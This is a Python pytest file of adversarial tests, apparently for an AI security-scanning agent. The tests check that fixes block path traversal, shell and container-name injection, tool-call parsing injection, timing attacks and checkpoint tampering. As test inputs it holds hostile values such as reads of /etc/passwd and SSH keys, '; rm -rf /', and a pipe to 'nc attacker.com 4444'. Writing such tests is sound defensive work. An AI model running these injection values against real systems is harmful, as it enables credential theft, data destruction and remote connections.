"""Adversarial security tests for the 2026 deep audit fixes.

These tests verify that each security fix actually blocks the attack vectors
it was designed to prevent. Each test tries to BYPASS the fix.
"""

from __future__ import annotations

import ast
import hashlib
import hmac
import json
import re
import textwrap
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import os
import platform
import sys

import pytest


_IS_WINDOWS = platform.system() == "Windows"


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: PATH TRAVERSAL in file_edit_actions.py
# ═══════════════════════════════════════════════════════════════════════════════


class TestPathTraversalFix:
    """Attack the _validate_workspace_path function with traversal payloads.
    
    NOTE: These tests only work on Linux where /workspace exists as a real path.
    On Windows, Path.resolve() converts /workspace to C:\\workspace which can't
    match. The actual code runs inside a Docker Linux container.
    """

    def _validate(self, path: str) -> str:
        from phantom.tools.file_edit.file_edit_actions import _validate_workspace_path
        return _validate_workspace_path(path)

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_simple_traversal_blocked(self) -> None:
        """../../../etc/passwd should be blocked."""
        with pytest.raises(ValueError, match="outside /workspace"):
            self._validate("../../../etc/passwd")

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_absolute_path_outside_workspace(self) -> None:
        """/etc/passwd should be blocked."""
        with pytest.raises(ValueError, match="outside /workspace"):
            self._validate("/etc/passwd")

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_absolute_root(self) -> None:
        """/ should be blocked."""
        with pytest.raises(ValueError, match="outside /workspace"):
            self._validate("/")

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_encoded_traversal(self) -> None:
        """Paths containing .. in various forms should be blocked."""
        with pytest.raises(ValueError, match="outside /workspace"):
            self._validate("/workspace/../../etc/passwd")

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_double_traversal(self) -> None:
        with pytest.raises(ValueError, match="outside /workspace"):
            self._validate("/workspace/../../../root/.ssh/id_rsa")

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_workspace_itself_allowed(self) -> None:
        """Path under /workspace should work."""
        result = self._validate("/workspace/test.txt")
        assert "/workspace" in result

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_relative_path_stays_in_workspace(self) -> None:
        """A relative path should be prefixed to /workspace."""
        result = self._validate("myfile.txt")
        assert result == "/workspace/myfile.txt"

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_nested_workspace_path_allowed(self) -> None:
        result = self._validate("/workspace/deep/nested/dir/file.py")
        assert "/workspace" in result

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_home_directory_blocked(self) -> None:
        with pytest.raises(ValueError, match="outside /workspace"):
            self._validate("/home/root/.bashrc")

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_proc_filesystem_blocked(self) -> None:
        with pytest.raises(ValueError, match="outside /workspace"):
            self._validate("/proc/self/environ")

    @pytest.mark.skipif(_IS_WINDOWS, reason="/workspace path validation only works on Linux")
    def test_dev_null_blocked(self) -> None:
        with pytest.raises(ValueError, match="outside /workspace"):
            self._validate("/dev/null")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: SHELL INJECTION in search_files
# ═══════════════════════════════════════════════════════════════════════════════


class TestShellInjectionFix:
    """Verify that shlex.quote is used for all shell-facing parameters."""

    def test_shlex_quote_used_for_path(self) -> None:
        """search_files must use shlex.quote for all shell parameters."""
        src = Path("phantom/tools/file_edit/file_edit_actions.py").read_text(encoding="utf-8")
        assert "shlex.quote" in src, "shlex.quote must be used for shell parameter escaping"

    def test_no_raw_string_interpolation_in_shell(self) -> None:
        """No f-string with unquoted variables should appear in rg/find commands."""
        src = Path("phantom/tools/file_edit/file_edit_actions.py").read_text(encoding="utf-8")
        # The old vulnerable pattern was: f"rg ... '{file_pattern}' '{escaped_regex}' '{path}'"
        # The new safe pattern uses shlex.quote variables
        dangerous_patterns = [
            r"'{file_pattern}'",
            r"'{escaped_regex}'",
            r"'{regex}'",
        ]
        for pattern in dangerous_patterns:
            assert pattern not in src, (
                f"Dangerous pattern {pattern} found - raw string interpolation in shell command"
            )

    def test_import_shlex_present(self) -> None:
        src = Path("phantom/tools/file_edit/file_edit_actions.py").read_text(encoding="utf-8")
        assert "import shlex" in src


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: TOOL INVOCATION INJECTION in llm/utils.py
# ═══════════════════════════════════════════════════════════════════════════════


class TestToolInvocationParsingFix:
    """Attack the parse_tool_invocations function with malformed inputs."""

    def _parse(self, content: str) -> list[dict[str, Any]] | None:
        from phantom.llm.utils import parse_tool_invocations
        return parse_tool_invocations(content)

    def test_valid_tool_call(self) -> None:
        """Normal tool call should work."""
        content = '<function=terminal_execute>\n<parameter=command>ls</parameter>\n</function>'
        result = self._parse(content)
        assert result is not None
        assert result[0]["toolName"] == "terminal_execute"
        assert result[0]["args"]["command"] == "ls"

    def test_injection_in_tool_name_blocked(self) -> None:
        """Tool name with special chars should be rejected."""
        content = '<function=../../evil>\n<parameter=cmd>ls</parameter>\n</function>'
        result = self._parse(content)
        # Should return None or empty because tool name has invalid chars
        assert result is None or len(result) == 0

    def test_injection_in_param_name_blocked(self) -> None:
        """Param name with dot/slash should be rejected."""
        content = '<function=terminal_execute>\n<parameter=../../evil>ls</parameter>\n</function>'
        result = self._parse(content)
        if result:
            # The injected param should not appear
            assert "../../evil" not in result[0]["args"]

    def test_sql_injection_in_tool_name(self) -> None:
        """Tool name with SQL-like payload should be rejected."""
        content = "<function='; DROP TABLE users; -->\n<parameter=x>y</parameter>\n</function>"
        result = self._parse(content)
        assert result is None or len(result) == 0

    def test_spaces_in_tool_name_rejected(self) -> None:
        content = '<function=terminal execute>\n<parameter=cmd>ls</parameter>\n</function>'
        result = self._parse(content)
        assert result is None or len(result) == 0

    def test_html_entity_in_param_value_decoded(self) -> None:
        """HTML entities in param values should be decoded."""
        content = '<function=test_tool>\n<parameter=data>&lt;script&gt;</parameter>\n</function>'
        result = self._parse(content)
        assert result is not None
        assert result[0]["args"]["data"] == "<script>"


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: TIMING ATTACK on token verification
# ═══════════════════════════════════════════════════════════════════════════════


class TestTimingSafeTokenComparison:
    """Verify that hmac.compare_digest is used for token comparison."""

    def test_hmac_compare_digest_used(self) -> None:
        src = Path("phantom/runtime/tool_server.py").read_text(encoding="utf-8")
        assert "hmac.compare_digest" in src, (
            "Token comparison must use hmac.compare_digest to prevent timing attacks"
        )

    def test_no_direct_equality_for_token(self) -> None:
        src = Path("phantom/runtime/tool_server.py").read_text(encoding="utf-8")
        # Find the verify_token function and ensure no == for credential comparison
        in_verify = False
        for line in src.splitlines():
            if "def verify_token" in line:
                in_verify = True
            elif in_verify and line.strip() and not line.startswith(" ") and not line.startswith("\t"):
                in_verify = False
            if in_verify and "credentials.credentials ==" in line:
                pytest.fail("Direct == comparison found for token in verify_token (timing attack)")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: INFORMATION DISCLOSURE in health endpoint
# ═══════════════════════════════════════════════════════════════════════════════


class TestHealthEndpointDisclosure:
    """Health endpoint should not expose internal state."""

    def test_no_sandbox_mode_exposed(self) -> None:
        src = Path("phantom/runtime/tool_server.py").read_text(encoding="utf-8")
        # Find health_check function
        in_health = False
        health_body = []
        for line in src.splitlines():
            if "async def health_check" in line:
                in_health = True
                continue
            if in_health:
                if line.strip() and not line.startswith(" ") and not line.startswith("\t"):
                    break
                health_body.append(line)
        body_text = "\n".join(health_body)
        assert "sandbox_mode" not in body_text
        assert "auth_configured" not in body_text
        assert "active_agents" not in body_text
        assert "environment" not in body_text


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: CHECKPOINT TAMPERING
# ═══════════════════════════════════════════════════════════════════════════════


class TestCheckpointIntegrity:
    """Attack the checkpoint HMAC verification."""

    def test_hmac_present_in_checkpoint(self) -> None:
        src = Path("phantom/checkpoint/checkpoint.py").read_text(encoding="utf-8")
        assert "hmac" in src, "Checkpoint must use HMAC for integrity verification"
        assert "compare_digest" in src, "HMAC comparison must be timing-safe"

    def test_tampered_checkpoint_rejected(self, tmp_path: Path) -> None:
        """Modified checkpoint data should fail HMAC verification."""
        from phantom.checkpoint.checkpoint import CheckpointManager
        from phantom.checkpoint.models import CheckpointData

        mgr = CheckpointManager(tmp_path)
        data = CheckpointData(
            run_name="test-run",
            target="http://example.com",
            scan_mode="quick",
            iteration=5,
            status="in_progress",
        )
        mgr.save(data)

        # Tamper with the checkpoint file
        cp_path = tmp_path / "checkpoint.json"
        original = cp_path.read_text(encoding="utf-8")
        tampered = original.replace('"iteration": 5', '"iteration": 999')
        cp_path.write_text(tampered, encoding="utf-8")

        # Load should return None due to HMAC mismatch
        loaded = mgr.load()
        assert loaded is None, "Tampered checkpoint should be rejected by HMAC verification"

    def test_valid_checkpoint_loads(self, tmp_path: Path) -> None:
        """Unmodified checkpoint should load successfully."""
        from phantom.checkpoint.checkpoint import CheckpointManager
        from phantom.checkpoint.models import CheckpointData

        mgr = CheckpointManager(tmp_path)
        data = CheckpointData(
            run_name="test-run",
            target="http://example.com",
            scan_mode="quick",
            iteration=5,
            status="in_progress",
        )
        mgr.save(data)
        loaded = mgr.load()
        assert loaded is not None
        assert loaded.iteration == 5


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: CONTAINER NAME INJECTION
# ═══════════════════════════════════════════════════════════════════════════════


class TestContainerNameValidation:
    """Attack the container name validation regex."""

    def test_valid_names_accepted(self) -> None:
        from phantom.runtime.docker_runtime import _CONTAINER_NAME_RE
        assert _CONTAINER_NAME_RE.match("phantom-scan-abc123")
        assert _CONTAINER_NAME_RE.match("phantom-scan-test-run-1")
        assert _CONTAINER_NAME_RE.match("phantom-scan-a1b2c3d4")

    def test_injection_names_rejected(self) -> None:
        from phantom.runtime.docker_runtime import _CONTAINER_NAME_RE
        # Command injection attempts
        assert not _CONTAINER_NAME_RE.match("phantom-scan-$(whoami)")
        assert not _CONTAINER_NAME_RE.match("phantom-scan-`id`")
        assert not _CONTAINER_NAME_RE.match("phantom-scan-; rm -rf /")
        assert not _CONTAINER_NAME_RE.match("; malicious-command")
        assert not _CONTAINER_NAME_RE.match("phantom-scan-test && echo pwned")
        assert not _CONTAINER_NAME_RE.match("phantom-scan-test | nc attacker.com 4444")

    def test_path_traversal_names_rejected(self) -> None:
        from phantom.runtime.docker_runtime import _CONTAINER_NAME_RE
        assert not _CONTAINER_NAME_RE.match("phantom-scan-../../etc")
        assert not _CONTAINER_NAME_RE.match("../../../root")


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: ARGUMENT PARSER DoS
# ═══════════════════════════════════════════════════════════════════════════════


class TestArgumentParserDoS:
    """Attack the argument parser with oversized JSON payloads."""

    def test_max_json_length_enforced(self) -> None:
        src = Path("phantom/tools/argument_parser.py").read_text(encoding="utf-8")
        assert "_MAX_JSON_PARSE_LENGTH" in src, "JSON parsing must have a size limit"

    def test_oversized_json_not_parsed(self) -> None:
        from phantom.tools.argument_parser import _convert_basic_types
        # Create a string longer than the limit
        huge_json = '{"key": "' + "A" * 200_000 + '"}'
        result = _convert_basic_types(huge_json, dict)
        # Should return empty dict (fallback) since JSON parsing is skipped for oversized input
        assert isinstance(result, dict)
        assert result == {}


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: ERROR MESSAGE INFORMATION DISCLOSURE
# ═══════════════════════════════════════════════════════════════════════════════


class TestErrorDisclosureFix:
    """Verify error messages don't leak internal details."""

    def test_no_token_details_in_error(self) -> None:
        src = Path("phantom/tools/executor.py").read_text(encoding="utf-8")
        assert "Invalid or missing sandbox token" not in src, (
            "Error messages must not reveal authentication mechanism details"
        )

    def test_no_tool_server_details_in_error(self) -> None:
        src = Path("phantom/tools/executor.py").read_text(encoding="utf-8")
        assert "HTTP error calling tool server" not in src
        assert "Request error calling tool server" not in src


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: RATE LIMITING BYPASS
# ═══════════════════════════════════════════════════════════════════════════════


class TestRateLimiting:
    """Verify rate limiting exists in tool server."""

    def test_rate_limit_code_present(self) -> None:
        src = Path("phantom/runtime/tool_server.py").read_text(encoding="utf-8")
        assert "_check_rate_limit" in src
        assert "429" in src or "TOO_MANY_REQUESTS" in src


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK: CONFIG FILE PERMISSIONS
# ═══════════════════════════════════════════════════════════════════════════════


class TestConfigPermissions:
    """Verify config file permission checks exist."""

    def test_permission_check_code_present(self) -> None:
        src = Path("phantom/config/config.py").read_text(encoding="utf-8")
        assert "st_mode" in src or "S_IRGRP" in src or "chmod" in src, (
            "Config load must check file permissions"
        )
